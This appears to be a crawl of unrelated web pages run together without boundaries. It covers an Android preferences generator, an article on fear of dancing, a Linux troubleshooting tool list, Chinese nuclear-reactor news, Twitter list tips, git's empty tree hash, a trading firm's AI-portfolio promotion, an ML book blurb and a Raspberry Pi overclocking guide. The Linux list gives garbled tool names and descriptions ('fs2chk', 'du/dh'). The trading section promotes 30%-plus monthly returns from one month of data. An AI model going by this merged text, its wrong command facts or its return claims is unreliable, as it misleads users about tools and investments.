This generates the java and xml you'll need for a simple preferences page for your Android App.
Just enter the list of preferences in json format (press [Example] for an example) and then
copy/paste the results into your android project.
The snippet files must be merged into your existing files where marked with '+', others are complete files.

<p>
After you get it compiling, you can tweak the generated skeleton in your local copy
e.g. by adding title/summary/defaultValue's to the preferences.xml file.

	                <p>
	Director Michael Allcock has a problem he’d like to share with the world.&nbsp; At a Christmas party, he was asked to dance by an attractive coworker. “I knew right there and then that, if I was going to go anywhere with this woman, I needed to get on that dance floor — pronto,” he remembers. “But I couldn’t do it. I stood there, utterly frozen in my tracks. I was simply paralyzed with fear and anxiety.”</p>
<p>
	Allcock has chorophobia — in Greek, chorós means dance — which is defined as a fear of dancing. He has rarely danced in public since he was a child. “Dancing is supposed to be fun,” he says. “Dancing is supposed to be liberating. Don’t I want to have fun? Don’t I want to feel free? Why can’t I dance? But then I found out I wasn’t alone.”</p>

    
    

<p>
	He decided to turn the camera on himself and go on a global quest to understand why he is so terrified by the simple act of dancing — a story told in the documentary Channel film <a href="https://www.cbc.ca/documentarychannel/docs/fear-of-dancing"><em>Fear of Dancing</em></a>.</p>
<p>
	<strong>Chorophobia is more common than you think</strong></p>
<p>
	Allcock estimates that there are hundreds of thousands of chorophobes. Among them is British actor and author Stephen Fry. “I really, really, really hate dancing and have not the slightest milligram of envy for those who can do it,” he says.</p>
<p>
	Another chorophobe Allcock encounters is American singer-songwriter Be Steadwell. She’s even written a song about it.</p>

    
    

<p>
	“The expectation for Black folks and Black women is to be a particular kind of dancer and to be good in a certain way,” Steadwell says in the documentary. “And I'm just not the person that, you know, someone's gonna see in a club and say, ‘Wow, you're a good dancer.’"</p>
<p>
	<strong>Humans have been dancing for a very, very long time</strong></p>
<p>
	We may be the only species to dance for pure pleasure.&nbsp; Nobody is exactly sure when we first started, but in <a href="https://www.cbc.ca/documentarychannel/docs/fear-of-dancing"><em>Fear of Dancing</em></a> Allcock takes us to one of the ancient places on earth where it may have started, Africa, a continent with cultures steeped in dancing.</p>
<p>
	It also appears the impulse to dance is an instinctual part of being human. Marcel Zentner, a professor at the University of Innsbruck in Austria, found that babies may be born with a predisposition to move rhythmically in response to music. “[Five- to 24-month-old infants] were ... played this music and then spontaneously, they would start to move,” he says.</p>
<p>
	Infants listened to a variety of sounds including classical music, rhythmic beats and speech. Their movements were recorded by video and 3D motion-capture technology and analyzed. The study found the better the children were able to synchronize their movements with the music, the more they smiled.</p>
<p>
	<strong>Fear of dancing develops as we grow older</strong></p>
<p>
	So why do some people grow up to be afraid of it? “If you had 50 people who all had a fear of dancing, they'd probably have 50 different reasons for why they have a fear of dancing,” says Peter Lovatt, a dance psychologist at the University of Hertfordshire in the U.K. The problem often starts during the teenage years when, “suddenly, dancing becomes about mate selection or about competency issues — moving your body in a way that your social group may find acceptable or unacceptable,” he says.</p>
<p>
	Allcock remembers that by the time he reached Grade 11, his lifestyle changed. He stopped going to class to front a band called Barbaric Fantasy. “It was all about partying,” he says. “I became a stereotype: the dropout metal-head stoner that's just too cool to dance.”</p>
<p>
	For a single guy back on the dating scene, the pressure to dance can be intense, and — like a fear of heights — chorophobia is real. “The only difference is no one would ever think of helping a person with that fear by dragging them to the edge of a building,” Allcock says.</p>
<p>
	<strong>Ways to help chorophobes learn to embrace dancing</strong></p>
<p>
	Champion ballroom dancer and instructor Olé Burlay thinks Allcock could overcome his fear if he just had the right teacher. “I think that the fact that people are afraid of dance is just because they’re not capable of doing it,” Burlay says. “So, if you get the right instructor that introduces it right away [in a] gentle form, that can be overcome.”</p>
<p>
	Jorge Ortiz, once a reluctant dancer, and his business partner, Rebekah Diaz, have developed a virtual studio to teach partner dance steps. “Hopefully, you get the experience of being in a flesh-and-blood dance studio without having the anxiety to actually have to walk through the doors,” says Ortiz.</p>

    
    

<p>
	Chorophobes in Toronto have found a novel way to bust a move. They meet once a week to dance together in a dimly lit room. “Darkness is such an equalizer,” says Eric Allin, one of the organizers of the party. “With the lights off, it's no longer a visual event. It takes on ... a more abstract meaning. You're unable to perceive others, and you're not being perceived.”</p>
<p>
	There is, Allcock says, a lack of understanding about people who have a fear of dancing, and he hopes his film creates more awareness about the problem. “I kind of resent the fact that society expects me to dance," he says. “It's almost like this is an act of rebellion for me not to dance.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Working in a Linux environment requires knowledge of Linux cli tools and troubleshooting. In this article, it would
be presented CLI tools that are most important for troubleshooting.
Short story
Let say you are working with Linux and your work would be: 1% once-time setup and 99% troubleshooting. So as we can see from these homemade statistics you going to spend most of your time in CLI and finding “why does not work”. This is not a trivial task. It requires knowledge of how Linux works, how subsystems of Linux works,
how complete “line” from typing command up to running, delivering some results works, logs.
Yes, logs are the most important.
So let me start with naming tools and then a short description of some of them.
fs2chk
du/dh
strace/ltrace
lsof
ldd
tcpdump
netstat
mailq/showq
traceroute/tracepath
ping/telnet/nc
dig
curl
nmap
top
ps
pkg manager(rpm, yum, apt, others)
lsmod
awk
sed
vim</p>
<h3>fs2chk</h3>
<p>Used for file system integrity check. Not all time you will have regular shutdown or reboot –
sometimes it happens power goes off and your server gets back with a file system issue. Usually, in that
case is best to use fs2chk</p>
<h3>du/dh</h3>
<p>Command du is used to show space usage per partition. Sometimes happen your partition are used with
some dumb files/logs (crash files) and you need to see what is happening because application or service you try to run report free space issue. Command dh is used to check directory with sub-
directories and discover what file occupied most of the space.</p>
<h3>strace/ltrace</h3>
<p>Running application it just stops at some point. You don’t have logs. Nothing. And there is no debug switch (for example ssh -vvv, where you can see all steps that are done) or any other way to see what is hell going on. So strace is for functions that is used and ltrace are library that are used at some point.
We mostly need trace tool to see details of operation for some applications. Example: we run applications or services and we see an issue and we are not sure why.</p>
<h3>lsof</h3>
<p>You have an issue removing files/files because they are used by some unknown application. Or you want to see how much is open files so you can see if the maximum limit for open files is reached.</p>
<h3>ldd</h3>
<p>When the application does not run at all – the usual suspect is missing the library. This tool is handy to discover which library missing.</p>
<h3>tcpdump</h3>
<p>Connection to server sometimes has issues. So the best way to check what is going on and to troubleshooting is tcpdump. You can pick up the interface, type of protocol, from/to IP, or any low level for all TCP/IP layers.</p>
<h3>netstat</h3>
<p>Simple to see the status of open ports, connection state, and other information that we need to see if services running properly on a given port.</p>
<h3>mailq/showq</h3>
<p>The most vital service in each company is email. And sometimes you need to see what is happening with email (sending or recv). Best tool for this is mailq/showq (it is the same tool, showq is a new one that replace
mailq on older Linux)</p>
<h3>ethtool</h3>
<p>On a low level could happen issue with our ethernet connection and we want to review our cable/port on Linux. So the tool is best for this job. Beside this, you can review other specific ethernet things (auto-negotiation etc)</p>
<h3>traceroute/tracepath</h3>
<p>Ideal to see between server and client if there is a network path issue as also a delay between them.</p>
<h3>ping/telnet/nc</h3>
<p>The very handy tool on the first step to see if is server up as also services.</p>
<h3>dig</h3>
<p>With this tool, you can perform all DNS troubleshooting. Review MX records, A, NS, etc.</p>
<h3>curl</h3>
<p>One of the best tools for troubleshooting different protocols: HTTP, RTMP, FTP, etc. It also has a benchmark integrated for a view of response (DNS, first byte, etc).</p>
<h3>nmap</h3>
<p>A very good tool for discovering services, open ports, and other useful information. Also, you can use on your servers to check if there is some unusual thing and secure them.</p>
<h3>top</h3>
<p>Active process list with memory, CPU, parent/child connection, and other information that helps to see where the issue starts.</p>
<h3>ps</h3>
<p>Process list, you can check and see what is currently running (very quick, the first step for troubleshooting)
pkg manager(rpm, yum, apt, others)
In troubleshooting we need to verify or to find some library or application – so this tool is best for that
operation.</p>
<h3>lsmod</h3>
<p>People who never have issues with kernel modules would never use this tool or get this tool seriously.
The tool provides information about loaded kernel modules as also usage, memory, etc.</p>
<h3>awk/sed/grep</h3>
<p>In a bunch of logs sometimes is a need to find proper information. All these tools are swiss knives for bash scripting and handy for parsing logs for specific information.</p>
<h3>vim</h3>
<p>The best editor in the world. Learn so you can answer on an interview how to quit vim.</p>

																				<p>BEIJING: China has powered up its first domestically developed nuclear reactor — Hualong One — a significant step in Beijing’s attempts to become less dependent on Western countries for energy security and critical technology.</p>
<p>The reactor, which was connected to the national grid on Friday, can generate 10 billion kilowatt-hours of electricity each year and cut carbon emissions by 8.16 million tonnes, according to China National Nuclear Corporation (CNNC).</p>
<p>“This marks China breaking the monopoly of foreign nuclear power technology and officially entering the technology’s first batch of advanced countries,” CNNC said in a statement.</p>
<p>Nuclear plants supplied less than 5% of China’s annual electricity needs in 2019, according to the National Energy Administration, but this share is expected to grow as Beijing attempts to become carbon-neutral by 2060.</p>
<p>Reducing its dependence on Western allies in critical high-tech sectors such as power generation is a key goal in Beijing’s “Made in China 2025” plan.</p>
<p>Billions of dollars in state subsidies have been given to Chinese companies to speed the process — a move that has angered China’s trade partners and sparked a protracted trade row with Washington.</p>
<p>Work on the Hualong One reactor started in 2015 and there are currently six other reactors under construction at home and abroad, the state-owned plant operator CNNC said.</p>
<p>The Hualong One, deployed at a plant in the eastern province of Fujian, will be put into commercial use by the end of the year after undergoing tests.</p>
<p>China has 47 nuclear plants with a total generating capacity of 48.75 Gigawatts — the world’s third highest after the United States and France.</p>
<p>Beijing has invested billions of dollars to develop its nuclear energy sector in recent years as it struggles to wean its economy from coal.</p>
<p>Thirteen nuclear plants are under construction, more than in any other country, despite environmental and safety concerns.</p>
<p>In August 2016, officials were forced to shelve plans for a nuclear waste facility in Lianyungang, a city in eastern Jiangsu province, after a rare public protest by thousands of residents.</p>									</div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>July 12<sup>th</sup>, 2020</p>
<p>Believe it or not, Twitter can be a very useful source of information and news. Or, it can waste your time and make you sad. It’s all in how you use it. Here I’ll show you how to make Twitter work for you, instead of against you.</p>
<p>There are many things you can do to turn Twitter into a useful tool, but there is one central concept that is more important than everything else combined. If you absorb and apply this idea, you will transform Twitter from a source of pointless irritation into a veritable lifehack.</p>
<p>The secret is to completely separate the concepts of <em>following</em> and <em>reading</em>.</p>
<p>Let me explain: the person finally giving in and signing up for Twitter looks for instruction and advice on how to get started and how to use it. This advice, either from helpful writers on the internet or from Twitter itself, goes something like this:</p>
<p><strong>Look for people who are interesting to you;</strong></p>
<p><strong>Follow them;</strong></p>
<p><strong>Observe your timeline, where their tweets will appear.</strong></p>
<p>If you follow this advice, you will be doing it wrong. This is the exact opposite of how you should use Twitter. The problems with this approach are:</p>
<p>You may see the tweets not always in the order in which they were tweeted, but in some other order that Twitter creates for you;</p>
<p>You will see “promoted tweets” interpolated between the tweets you signed up to see. This is paid advertising;</p>
<p>You will see random other things you didn’t ask for;</p>
<p>You will be inundated with “suggestions” from Twitter about people to follow, trending topics to keep on top of, and other irrelevant nonsense;</p>
<p>You will never see some of the tweets tweeted by the people you are following. They simply will not appear in your timeline;</p>
<p>Everyone can see the list of people you follow. You may or may not want this;</p>
<p>You will discover that the people you followed because you admire them have nothing interesting to say, only tweeting cat pictures and worn-out memes.</p>
<p>In short, you will be fed tons of stuff you never signed up for, and not get what you wanted.</p>
<p>You can’t turn <em>any</em> of this off. Twitter lets you tell it that you want to see <em>less</em> of some kinds of things, but there are no actual settings to turn off advertising or suggestions about fascinating hashtags.</p>
<p>The first step in fixing Twitter for yourself is to understand what following is really for. You don’t follow an account because you want to read their tweets. Twitter is “social media”, and following is a social signal. When you follow someone you are declaring that you approve of that person. Whether or not this is what you intended, this is how your decision to follow someone will be interpreted. If you are, for example, a journalist researching neo-Nazis, and part of your research involves tracking what they are saying on Twitter, you may not want to be seen as endorsing these people.</p>
<p>Obviously, you may want to read certain people’s tweets without following them. And you can! Twitter allows you to create private <em>lists</em> of accounts that you can track without following. You can see all their tweets scroll by without appearing to have endorsed them. The composition of your private lists, and even their existence, will remain secret. The people you add won’t know you’re adding them, nor that you’re seeing their tweets, unless you choose to interact with them. In addition, the tweets will appear in chronological order, with no interpolated advertising nor any other junk, unlike in your timeline. But you must not forget to mark the lists as private. In the picture below, one arrow points to the widget for creating a new list, and another points to the all-important checkbox for making the list private. You should only make private lists; there is no reason to make public lists, and, in fact, some people object to being placed in them (for some reason that escapes me, but behavior on Twitter is weird in many ways).</p>
<p>&nbsp;<img src="https://lee-phillips.org/howtotwitter/newlist.png" alt="Making a list"></p>
<p>Make as many lists as you want, as fine-grained or as general as you think will be useful to you. You can have an astronomy list, or a list just with people who talk about astrophotography with iPhones. You can make a list for local news, and one for international news. You can put accounts in more than one list, so the exact composition of a list is not a crucial decision. This is how you separate the concepts of reading and following. You follow when you want to let people know you are following (hi, Mom), and you want everyone else to know, too. When you become famous and have a million followers, you can follow others to amplify their signals. Until then, follow to encourage, to lend support, and to let others know where you stand. If you also want to read the tweets of someone you follow (and you might not), put that person in one of your lists in addition. Your followee’s tweets will also appear in your timeline, but you won’t see them there, because <em>you will never look at your timeline</em>. Of course, you literally don’t have to follow a single person. Following is public. Aggregating accounts into lists is your private business.</p>
<p>Lists become most useful when there is an interface for conveniently seeing what’s on them. The regular Twitter clients are not very good for this, but Twitter has an alternative client that is made for it. Use <a href="https://help.twitter.com/en/using-twitter/how-to-use-tweetdeck">TweetDeck</a>. It divides your twitterverse into columns. Each column can contain the tweets from one of your lists; in addition, you can create columns that track search terms, individual accounts, hashtags, your notifications, your direct messages, and more. By default, it will have a column with your timeline, but you can delete that, because, as I hope is clear by now, your timeline is a waste of time.</p>
<figure>
<img src="https://lee-phillips.org/howtotwitter/tweetdeck.jpg" alt="Tweetdeck. Picture by Ruben Schade">
</figure>
<p>This interface, although not perfect, helps a great deal in making Twitter more useful. If you keep it open, it can be a low-distraction way of monitoring recent tweets from low-traffic lists. You can delete columns you don’t care about today, and add them back in tomorrow.</p>
<p>Lists and search terms, combined with the avoidance of the timeline and the use of TweetDeck, already turns Twitter from a cesspool with advertising into a useful news feed. But by combining this with a few other practices, you can make Twitter even better.</p>
<p>First, control yourself. Use the platform as a source of timely information, and as a way to be helpful with others by offering information or advice. Do not, ever, no matter how strongly you feel that someone is <em><a href="https://xkcd.com/386/">wrong</a></em>, get into an argument on Twitter. I have often failed to heed this advice myself; do what I say, not what I do. Twitter can be a fantastic source of news from all over the world; it is often the first place you will hear about something, and sometimes the only place. It can be a very useful platform for receiving and offering technical information, such as links to papers. I recently contributed a scrap of code, in a tweet, for a maintainer of the venerable linux utility <code>curl</code>; the result is in <a href="https://github.com/curl/stats/commit/ac6ae20082fd5e61aa7122b1d4c6030e48ba52a9">this commit</a>. This kind of interaction is satisfying, but trying to have an actual discussion or argument never is, because it is impossible to do with this platform. At best, you will score points against someone not as clever as you; and that and $2.50 will get you a cup of coffee.</p>
<p>Next, use the muting function. Even members of your carefully curated lists will sometimes decide to spend a week talking incessantly about their new sneakers. Mute them until they get over it. <a href="https://lee-phillips.org/makeTwitterBetter/">Mute words and phrases</a>, too, for those times when a bunch of people are talking about something that you don’t care to see in your feeds (NBA playoffs, political debates, you name it).</p>
<p>When you discover someone interesting on Twitter, check their profile for a link to a website. <img src="https://lee-phillips.org/howtotwitter/redfern.png"> Click on it. If the person is worth following on Twitter, his or her website is likely to be of even more interest. Check the site for an Atom or RSS feed (look over to the right to see where I’ve used a version of the Atom/RSS feed icon). If there is one, subscribe in your feedreader.

<time datetime="2017-07-07">07 July 2017</time>

<p>After using <a href="https://git-scm.com/">Git</a> for a little while, there is a reasonable chance
you will run across the following hash:</p>
<pre><code>4b825dc642cb6eb9a060e54bf8d69288fbee4904
</code></pre>
<p>So where does it come from, and why should you care?</p>
<h2>Where does the hash come from?</h2>
<p>Every git repository, even an empty repository will contain the hash. This
can be verified with <code>git show</code>:</p>
<pre><code>$ git show 4b825dc642cb6eb9a060e54bf8d69288fbee4904
tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
</code></pre>
<p>So where does this hash come from? Well internally Git keeps track of a few
different object types. The most fundamental object is a blob which represents
file content. Blobs are then referenced by tree objects which represent
directories and commit objects reference tree objects. The diagram below gives
a quick overview of this:</p>
<p><img alt="Git object diagram taken from Pro Git." src="https://floatingoctothorpe.uk/2017/pro-git-objects-diagram.png"></p>
<p><small>The diagram above is taken from <a href="https://git-scm.com/book/en/v2">Pro Git</a> and licensed under
the Creative Commons <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/">Attribution-NonCommercial-ShareAlike 3.0
Unported</a> license.</small></p>
<p><strong>Note</strong>: the <a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Internals chapter</a> from Pro Git has more
info on objects if you're still curious.</p>
<p>So how does the hash fit in? Well it's actually the hash of an empty tree.
This can be verified by creating a object hash for either <code>/dev/null</code> of an
empty string:</p>
<pre><code>$ git hash-object -t tree /dev/null
4b825dc642cb6eb9a060e54bf8d69288fbee4904

$ echo -n '' | git hash-object -t tree --stdin
4b825dc642cb6eb9a060e54bf8d69288fbee4904
</code></pre>
<h2>Using the hash</h2>
<p>The empty tree hash is often used with <a href="https://git-scm.com/docs/git-diff">git diff</a>. For example
if you wanted to check for whitespace errors in a directory, you could use the
<code>--check</code> option and compare <code>HEAD</code> against the empty tree:</p>
<pre><code>$ git diff $(git hash-object -t tree /dev/null) HEAD --check -- po
po/ca.po:7: trailing whitespace.
+# Terminologia i criteris utilitzats
po/ru.po:4: trailing whitespace.
+#
</code></pre>
<p>The empty tree hash is also very useful when writing git hooks. A fairly common
pattern is to validate new commits before accepting them with code similar to
the following:</p>
<pre><code>for changed_file in $(git diff --cached --name-only --diff-filter=ACM HEAD)
do
  if ! validate_file "$changed_file"; then
    echo "Aborting commit"
    exit 1
  fi
done
</code></pre>
<p>This works fine if there are previous commits, however the HEAD reference will
not exist if no commits have been made. To get around this the empty tree hash
can be used when checking the initial commit:</p>
<pre><code>if git rev-parse --verify -q HEAD &gt; /dev/null; then
  against=HEAD
else
  # Initial commit: diff against an empty tree object
  against="$(git hash-object -t tree /dev/null)"
fi

for changed_file in $(git diff --cached --name-only --diff-filter=ACM "$against")
do
  if ! validate_file "$changed_file"; then
    echo "Aborting commit"
    exit 1
  fi
done
</code></pre>

Quantitative finance is an inherently secretive field where people who become profitable never reveal their secret formulas of success. However, this has started to change in recent years thanks to the likes of <a href="https://www.amazon.com/Advances-Financial-Machine-Learning-Marcos/dp/1119482089">Marcos Lopez de Prado</a>, <a href="https://www.amazon.com/Algorithmic-Trading-Winning-Strategies-Rationale/dp/1118460146">Ernest Chan</a>, and others. Although algorithmic trading remains a difficult problem to solve, the knowledge that these people have given to the public is invaluable. At Tradytics, we are continuously reading the latest research and trying new ideas to create profitable trading algorithms. <b>Today, we are going to talk about one such AI system that has resulted in us beating the market by 20% in the last 1 month</b>. Although this time period is very short, we want to give others a taste of how things work at Tradytics and how we go about solving different problems. We are also going to continue creating automated systems with an intent to consistently beat the market. <b>Let us now talk about how we created 5 AI driven portfolios that each gained over 30% returns in the last 30 days.</b>

</p>





<h3> A Million Portfolios </h3>

<p>

Let's start with a basic idea of what we do before diving into the details. 

</p><blockquote>

	<p>We generate millions of random portfolios, optimize their allocation using existing and proprietary portfolio optimization algorithms, and rank them using our AI engine.</p></blockquote>



<p>There has been thousands of papers on portfolio optimization in the last three decades. Starting with <a href="https://www.investopedia.com/terms/m/modernportfoliotheory.asp">markowitz portfolio optimization theory</a> to the more recent <a href="https://www.coursera.org/learn/trading-strategies-reinforcement-learning">reinforcement learning based optimization</a> methods, there are countless research papers to read and implement. However, as is the case with the majority of proposed methods in literature, the portfolios are created based on historical returns. If there is one thing we know about the stock market, it's that historical returns are not always representatives of future returns. This is a major problem that one needs to solve in order to create effective portfolios. As market regimes change, algorithms that were based on historical data suddenly become ineffective. Therefore, we need a way to combine the literature with a novel mechanism of adding some predictive power to our portfolio optimization strategies.</p>





<h4> Portfolio Optimization Strategies at Tradytics </h4>

<p>

	At Tradytics, we use 3 strategies from literature and two proprietary ones based on genetic algorithms. These strategies are:

	</p><ul>

		<li><a href="https://www.thebalance.com/minimum-variance-portfolio-overview-4155796">Minimum Variance Portfolio (MVP)</a></li>

		<li><a href="https://logical-invest.com/app/portfolio/maxsharpe/max-sharpe-portfolio">Maximum Sharpe Portfolio (MSR)</a></li>

		<li><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3070416">Eigen Portfolios</a></li>

		<li>Genetic Portfolios (GA)</li>

		<li>Exponential Genetic Portfolios</li>

	</ul>

	<p>MVP, MSR, Eigen, and GA based portfolio optimizations have been studied in the literature in depth and many trading firms still use them. This is where we start as well but we add something important on top to make these strategies work well. As we said in the start of this section, our basic idea is to generate millions of random portfolios and rank them using our custom AI algorithms. The ranking system is where our novelty comes in. The following image visually explains our portfolio selection process.</p>

	<p> 

	<img src="https://i.ibb.co/m4N3gB4/block-diagram.png"></p><p>After generating millions of portfolios and optimizing their weights with the aforementioned strategies, we use our proprietary ranking system that ranks all these portfolios in terms of their future predicted returns. We keep the best portfolio for each of the five strategies which goes to our website at <a href="https://tradytics.com/ai-portfolios.">Tradytics AI Portfolios</a>. Let us now dive a bit deep into the portfolio generation and selection process.</p>





<h4> Portfolio Generation: A Case of 25 Random Portfolios </h4>

<div><p>

	The image below shows 25 random portfolios from a collection of millions of portfolios we generated on October 31st. We start with selecting 5 random stocks for every portfolio and optimize the portfolio on 1 year of historical data up till October 23rd. After optimization, we backtest the portfolios to look at their historical returns. Since optimization is being done on historical data, the backtested returns are expected to be high which is what we can see in the image below.

	</p><p> 

	<img src="https://i.ibb.co/gVM2VrD/backtest-returns.png"></p><p> 

	However, there is a huge problem here. Our optimization procedure only looks at historical data and has no inherent predictive power. It implicitly makes an assumption that historical returns are predictive of future returns. This is not always true and solely relying on this assumption can lead to huge losses. We can see this if we forward test our 25 portfolios from October 23rd to October 31st, 2020. 

	</p><p> 

	<img src="https://i.ibb.co/CQmyFQY/forward-returns.png"></p><p> 

	Although profitable on historical data, the portfolios are all at loss when ran live - some are down 20% in a week. This illustrates the problem at hand with portfolio optimization methods. Let us try to solve it.

</p></div>





<h3> Portfolio Selection: Tradytics AI Ranking </h3>



<p>

At Tradytics, we go one step further from portfolio optimization. Once we get these millions of optimized portfolios, we use our proprietary AI ranking algorithm to rank them based on what the AI thinks will be their future returns. The ranking procedure is basically a predictive model that predicts the returns of portfolios based on their allocation by the optimization method, their spreads with each other, and their historical returns. Once the ranking is done, we simply pick the best portfolio from each of the five strategies noted above, thus giving us 5 portfolios every month. Our main goal with these portfolios is to generate large returns and consistently beat the market. In order to preserve our alpha, we will not give any technical details away regarding our ranking system.

</p>



<div><p>

The first set of portfolios we generated was on October 31st. Our top 5 portfolios had the following allocations and stocks in them. The green weights indicate longing the stock while the red weights suggest shorting.

</p><p> 

<img src="https://i.ibb.co/kqn36Gv/allocation.png"></p></div><p>

At the time of creating these portfolios, the weights did not make much sense by simply looking at each individual stock. However, since the ranking engine has been trained on a large amount of data and has high predictive power, it extracted certain patterns that made it confident that these portfolios would end up being profitable. Let us take a look at the returns of each individual stock as well as the entire portfolio.</p>





<h4> Portfolio Results: Top 5 Portfolios from October </h4>

<div><p>When looking at the backtest results of the top portfolios, it is easy to see that the historical returns are quite volatile would yield a low sharpe ratio. However, since history is not always the future and our ranking engine is tasked to predict the future returns, these portfolios were selected because of high AI confidence in larger returns.

</p><p> 

	<img src="https://i.ibb.co/Mcgj8HV/picked-backtest-returns.png"></p><p> 



When these 5 portfolios were run live for the month of November, these yielded very high returns as compared to the market. The <b>$SPY</b> index gained about <b>10%</b> in the month of November. The following image shows the gains of each of our portfolios.</p><p> 

<img src="https://i.ibb.co/PTPnqcj/portfolio-returns.png"></p></div><p>The results are quite impressive. All portfolios have garnered gains of above <b>30% in just 30 days</b> with some of them touching about <b>40%</b> cumulative returns. Now, we admit that there is a bias in the results here because of the strong bull market in the month of November. However, when the AI was ranking these portfolios, the bull market was not very strong - <b>$SPY</b> was down <b>2%</b> in October. It was the ranking engine that was able to find predictive patterns in the portfolios which would eventually result in large profits. This demonstrates the effectiveness of using machine learning and artificial intelligence in portfolio selection.</p>





<h3> What's Next </h3>

<p>

Tradytics is a fairly new company in the quantitative finance game. We realize that these are short term results and we need to show consistency before we can make any claims about the AI capabilities of our toolkits. Our plan is to keep adding these portfolios every month and record the performance for atleast one year. The hope here is to consistently beat the market with significantly high returns. We will keep you updated. If you have any questions, please do not hesitate to reach out to us at our <a href="https://discord.gg/QuvE2Z8">Discord</a>.

<p>Machine learning has great potential for improving products, processes and research. But <strong>computers usually do not explain their predictions</strong> which is a barrier to the adoption of machine learning. This book is about making machine learning models and their decisions interpretable.</p>
<p>After exploring the concepts of interpretability, you will learn about simple, <strong>interpretable models</strong> such as decision trees, decision rules and linear regression. Later chapters focus on general model-agnostic methods for <strong>interpreting black box models</strong> like feature importance and accumulated local effects and explaining individual predictions with Shapley values and LIME.</p>
<p>All interpretation methods are explained in depth and discussed critically. How do they work under the hood? What are their strengths and weaknesses? How can their outputs be interpreted? This book will enable you to select and correctly apply the interpretation method that is most suitable for your machine learning project.</p>
<p>The book focuses on machine learning models for tabular data (also called relational or structured data) and less on computer vision and natural language processing tasks. Reading the book is recommended for machine learning practitioners, data scientists, statisticians, and anyone else interested in making machine learning models interpretable.</p>

<p>Use this interactive tool to overclock your Raspberry Pi 4, Raspberry Pi 400 or Raspberry Pi 3B:</p>







<h2>How to overclock your Raspberry Pi using this tool </h2>



<p>This web-based tool allows you to quickly choose overclocking settings for your Raspberry Pi 4, Raspberry Pi 400 or Raspberry Pi 3.</p>



<p><em>(More Raspberry Pi models will follow if users ask for them!)</em></p>



<p>Please be sure to read through the entire page before applying the settings to your Raspberry Pi – there are also instructions what to do in case your Raspberry Pi will not boot after overclocking (which is a real risk). Also, you’ll need to make sure that the settings are long-term stable, and that your Raspberry Pi has adequate cooling. </p>



<blockquote><p>Quick tip: “poor man’s cooling”: turn your Raspberry Pi so that it sits vertically – on a Pi 4, the ARM Cortex-A72 CPU will be able to dissipate more heat this way, simply due to physics.</p><cite>cool cooling hack</cite></blockquote>



<p>Follow these step-for-step instructions to use this tool:</p>



<h3> Step 1: choose your Raspberry Pi Model </h3>



<figure><img loading="lazy" width="773" height="434" src="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-117.png" alt="Select your Raspberry Pi Model in the interactive overclocking tool" srcset="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-117.png 773w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-117-300x168.png 300w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-117-768x431.png 768w" sizes="(max-width: 773px) 100vw, 773px"><figcaption>The screenshot shows the choice of different Raspberry Pi models built into this Raspberry Pi Overclocking Tool</figcaption></figure>



<p>Select the appropriate Raspberry Pi model you would like to overclock, and click on “<strong>Next Step</strong>“. Note, Raspberry Pi 3B is the Raspberry Pi 3B – we currently do not support overclocking Raspberry Pi 3B+ (see below for the reason). </p>



<h3>Step 2: choose overclock preset</h3>



<p>You have a choice between “medium booster” and “maximum performance”. </p>



<p>Be sure to provide adequate cooling to your Raspberry Pi, especially with “maximum performance” – when it overheats, the Raspberry Pi will reduce the clock frequency to protect the circuitry!</p>



<figure><img loading="lazy" width="801" height="504" src="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-118.png" alt="two different overclock presets for your Raspberry Pi - medium booster and maximum performance" srcset="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-118.png 801w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-118-300x189.png 300w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-118-768x483.png 768w" sizes="(max-width: 801px) 100vw, 801px"><figcaption>your choice of overclock presets in this Raspberry Pi overclocking tool</figcaption></figure>



<p>As you can see, we recommend to use at least a heatsink (or <a href="https://buyzero.de/products/flirc-gehause-fur-raspberry-pi-4?variant=31142645891174">FLIRC case</a>) for medium booster, and <a href="https://buyzero.de/products/fan-shim-fur-raspberry-pi-4-aktive-kuhlung?variant=29434389332070">active cooling</a> for maximum performance.  </p>



<p>Click on “<strong>Next Step</strong>“, to see the results.</p>



<h3>Step 3 Download or copy preset</h3>

<p>You will see a result screen. In case you have selected the maximum performance overclocking preset, you’ll also have to acknowledge that the preset <strong>will void your warranty</strong> by setting a special bit inside your Raspberry Pi:</p>

<p>Tick the checkmark box to access the preset in this case. <strong>In case you are worried about your warranty, we recommend to try the medium overclock preset instead.</strong></p>



<p>Using the button “<strong>Copy to clipboard</strong>“, you can copy the preset to your computer’s clipboard. Alternatively, you can also click on “<strong>Download</strong>” to download the overclock preset as a text file.</p>

<h3>Step 4 add your new overclock settings to your Raspberry Pi’s config.txt</h3>



<p>You’ll have to add these new settings to your Raspberry Pi to actually overclock it.</p>



<p>Edit config.txt for this purpose, and paste these lines at the bottom. Here is an example, using the command line editor nano:</p>



<pre>sudo nano /boot/config.txt</pre>



<figure><img loading="lazy" width="1024" height="716" src="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-124-1024x716.png" alt="/boot/config.txt being edited as root user, to enable overclocking (note overclocking settings at the bottom of the file)" srcset="https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-124-1024x716.png 1024w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-124-300x210.png 300w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-124-768x537.png 768w, https://picockpit.com/raspberry-pi/wp-content/uploads/2020/11/image-124.png 1043w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>medium overclock settings for Raspberry Pi 4 in /boot/config.txt</figcaption></figure>



